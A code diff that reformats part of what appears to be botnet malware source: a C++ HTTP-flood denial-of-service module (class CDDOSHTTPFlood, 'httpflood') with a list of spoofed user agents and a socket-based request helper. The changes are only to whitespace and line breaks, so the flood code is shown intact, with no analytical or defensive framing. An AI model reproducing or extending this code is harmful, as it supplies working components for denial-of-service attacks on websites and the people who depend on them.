@@ -40,28 +40,44 @@ char *g_szUserAgents[]={
 	"pxys/1.9.4",
 	NULL };
 
-CDDOSHTTPFlood::CDDOSHTTPFlood() { m_sDDOSName.Assign("httpflood"); }
+CDDOSHTTPFlood::CDDOSHTTPFlood() 
+{
+	m_sDDOSName.Assign("httpflood");
+}
 
 CString DoHTTPRequest(const char *szRequest, url &uURL)
-{	int sSocket, d;
-	
+{	
+	int sSocket, d;
 	sSocket=DoTcpConnect(uURL.sHost.CStr(), uURL.iPort);
-	if(sSocket==SOCKET_ERROR) return CString("");
+	if(sSocket==SOCKET_ERROR) 
+		return CString("");
 
 	xWrite(sSocket, szRequest, strlen(szRequest));
 	
 	char szBuf[4096]; CString sReply("");
 	while(true)
-	{	int i; if((i=xRead(sSocket,szBuf,4096))<=0) break;
-		if(i<4096) szBuf[i]=0; sReply.Append(szBuf);
-		for(d=0;d<i;d++) if(!strncmp(szBuf+d,"\r\n\r\n",4))
-		{	goto done_http; } }
+	{	
+		int i; 
+		if((i=xRead(sSocket,szBuf,4096))<=0) 
+			break;
+		if(i<4096)
+			szBuf[i]=0; sReply.Append(szBuf);
+		for(d=0;d<i;d++)
+			if(!strncmp(szBuf+d,"\r\n\r\n",4)){	
+				goto done_http;
+			} 
+	}
 done_http:
 	while(true)
-	{	int i; if((i=xRead(sSocket,szBuf,4096))<=0) break;
-		if(i<4096) szBuf[i]=0; sReply.Append(szBuf); }
+	{	
+		int i; 
+		if((i=xRead(sSocket,szBuf,4096))<=0) 
+			break;
+		if(i<4096) 
+			szBuf[i]=0; sReply.Append(szBuf); }
 
-	xClose(sSocket); sSocket=SOCKET_ERROR;
+		xClose(sSocket); 
+	sSocket=SOCKET_ERROR;
 
 	return sReply;
 }
